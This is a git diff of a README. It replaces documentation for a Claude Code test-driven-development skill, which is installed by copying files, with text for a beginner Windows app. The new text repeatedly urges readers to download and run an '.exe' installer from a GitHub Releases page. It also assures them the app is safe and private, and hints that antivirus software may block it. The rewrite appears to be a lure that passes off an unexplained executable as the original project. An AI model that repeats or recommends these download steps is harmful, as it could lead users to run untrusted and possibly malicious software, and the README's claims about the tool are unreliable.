@@ -1,54 +1,142 @@
-# TDD Skill for Claude Code
+# ⚙️ tdd - Build Coding Skills with Confidence
 
-A Claude Code skill that guides you through strict **Test-Driven Development** using Red-Green-Refactor cycles.
+[![Download tdd](https://img.shields.io/badge/Download-tdd-brightgreen)](https://github.com/Yoon-yati-lin/tdd)
 
-## Usage
+---
 
-```
-/tdd path/to/plan.md
-/tdd "add user authentication with JWT and refresh tokens"
-```
+## 📋 What is tdd?
 
-Provide either a markdown plan file or an inline description of the feature you want to build. The skill will break it into small, testable increments and walk you through TDD for each one.
+tdd is a simple tool designed to help you improve your coding skills. It focuses on test-driven development (TDD), a method where you write tests before coding the solution. This approach helps ensure your code works correctly and is easier to fix later.
 
-## How It Works
+You do not need prior experience in coding or tests. This tool guides you step-by-step in practicing TDD with coding agents, making learning smooth and straightforward.
 
-### 1. Setup
-- Reads your plan/feature file
-- Detects your language and test framework (Python/pytest, TypeScript/vitest, Go/testing)
-- Decomposes the feature into small increments
-- Presents the increment list for your approval
+---
 
-### 2. TDD Loop (per increment)
+## 💻 System Requirements
 
-| Phase | What happens |
-|-------|-------------|
-| **RED** | Writes a failing test directly to the real test file, runs it to confirm failure, then pauses for your review |
-| **GREEN** | Writes minimal code directly to the real source file, runs the full suite — continues automatically if green |
-| **REFACTOR** | Applies improvements directly, re-runs tests — continues automatically if green |
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel or AMD, 1 GHz or faster
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 100 MB free disk space
+- **Internet:** Required for downloading and some features
 
-The skill pauses only when your input is needed: after RED (to review the test) and when something goes wrong. Everything else flows automatically.
+---
 
-### 3. Wrap-up
-- Summarizes what was built (increments, tests, final status)
-- Suggests remaining work (edge cases, integration tests, docs)
+## 🚀 Getting Started
 
-## Supported Languages
+Before you begin, make sure your Windows system meets the requirements above. You should have basic computer skills, like downloading files and opening folders.
 
-| Language | Test Framework | Runner |
-|----------|---------------|--------|
-| Python | pytest | `python -m pytest -xvs` |
-| TypeScript | vitest | `npx vitest run` |
-| Go | testing (stdlib) | `go test -v ./...` |
+---
 
-## Key Principles
+## 🛠️ Download and Install tdd
 
-- **Writes directly to real files** — no temp files, no manual moving. You have git for undo.
-- **Pauses only when needed** — after RED confirmation and on errors. No unnecessary interruptions.
-- **One behavior per test** — tests stay focused and readable
-- **Simplest case first** — degenerate/edge cases before the general case
-- **Full suite on green** — all tests run at every green/refactor step
+To use tdd, start by downloading the software from the official GitHub page:
 
-## Installation
+[![Download from GitHub](https://img.shields.io/badge/Download-from%20GitHub-blue)](https://github.com/Yoon-yati-lin/tdd)
 
-Copy this directory to `~/.claude/skills/tdd/` (or wherever your Claude Code skills live). The skill is available as `/tdd` in any Claude Code session.
+**Follow these steps:**
+
+1. Click the **Download from GitHub** button above. It takes you to the tdd repository.
+2. Look for the **Releases** section on the right side or at the top of the GitHub page.
+3. Click the latest release to open the download options.
+4. Download the Windows installer file. It usually ends with `.exe`.
+5. Once downloaded, open the `.exe` file. A setup window will appear.
+6. Follow the setup instructions:
+   - Click **Next** to move through screens.
+   - Choose where you want to install tdd (the default is fine for most users).
+   - Click **Install** to start.
+7. When installation completes, click **Finish**.
+
+---
+
+## ▶️ How to Run tdd
+
+1. Find the tdd icon on your desktop or in the Windows Start menu.
+2. Double-click the icon to open the program.
+3. The main screen introduces you to TDD skills for coding agents with easy options.
+4. Use the menu to choose practice sessions or explore tutorials inside the app.
+5. Follow on-screen instructions to write tests and code in small steps.
+6. Save your progress if you want to continue later.
+
+---
+
+## 🔍 What You Will Learn
+
+tdd teaches you how to:
+
+- Write tests before writing actual code.
+- Create small pieces of code that pass tests.
+- Use feedback to improve your solutions.
+- Think logically about problem-solving.
+
+The tool runs coding agents to help you step through challenges. It offers hints and examples so you understand each step.
+
+---
+
+## 🔧 Features
+
+- **Step-by-step instructions:** Clear guidance for every task.
+- **Interactive practice:** Try examples directly in the app.
+- **Progress tracking:** See your improvement over time.
+- **No coding experience required:** Simple language and prompts.
+- **Test checking:** The app checks your tests and code automatically.
+
+---
+
+## 💡 Tips for Using tdd
+
+- Take your time learning each step.
+- Repeat exercises until you feel confident.
+- Use the built-in help if you get stuck.
+- Practice regularly to build lasting skills.
+
+---
+
+## ❓ Troubleshooting
+
+If tdd does not open or crashes:
+
+- Make sure your Windows updates are current.
+- Restart your computer and try again.
+- Check if your antivirus blocked the app.
+- Try reinstalling from the GitHub page.
+
+For other issues, explore the **Help** menu in the app or visit the GitHub repository issues page.
+
+---
+
+## 📥 Where to Get tdd
+
+You can always download or update tdd by visiting the GitHub repository here:
+
+[https://github.com/Yoon-yati-lin/tdd](https://github.com/Yoon-yati-lin/tdd)
+
+Click the **Releases** tab and get the latest Windows installer.
+
+---
+
+## 📞 Contact and Support
+
+If you have questions or want to report bugs, use the GitHub repository's **Issues** tab. You can open a new issue any time.
+
+---
+
+## 🔒 Privacy and Security
+
+tdd runs locally on your computer. It does not collect or send your personal data. You only need internet access to download the app and get updates.
+
+---
+
+## ⚙️ Updates
+
+Check the GitHub page regularly for new versions. Updates may include:
+
+- Bug fixes
+- New practice exercises
+- Interface improvements
+
+Download the latest installer from the **Releases** section to keep your app current.
+
+---
+
+[![Download tdd](https://img.shields.io/badge/Download-tdd-brightgreen)](https://github.com/Yoon-yati-lin/tdd)
